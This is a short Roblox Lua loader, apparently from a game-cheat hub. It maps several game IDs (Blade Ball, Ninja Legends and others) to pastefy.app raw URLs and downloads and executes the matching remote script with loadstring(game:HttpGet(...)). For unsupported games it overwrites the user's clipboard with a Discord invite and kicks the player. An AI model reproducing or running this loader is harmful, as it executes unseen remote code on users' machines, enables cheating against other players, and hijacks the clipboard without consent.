local Players = game:GetService("Players")
local player = Players.LocalPlayer
local placeId = game.PlaceId
local Games = {
    [112490729816320] = "https://pastefy.app/u07ymoCm/raw", -- Spin a Soccer Card
    [3956818381] = "https://pastefy.app/iXNnwrSR/raw", -- Ninja Legends
    [107095834793267] = "https://pastefy.app/anuq7cHu/raw", -- Oil Empire
    [97598239454123] = "https://pastefy.app/p8jXLcXK/raw", -- Grow a Garden 2
    [13772394625] = "https://pastefy.app/68qyFNo0/raw", -- Blade Ball
}
local scriptUrl = Games[placeId]
if scriptUrl then
    loadstring(game:HttpGet(scriptUrl))()
else
    setclipboard("dsc.gg/getdrift")
    player:Kick("Game not supported.\nDiscord copied to clipboard!")
end
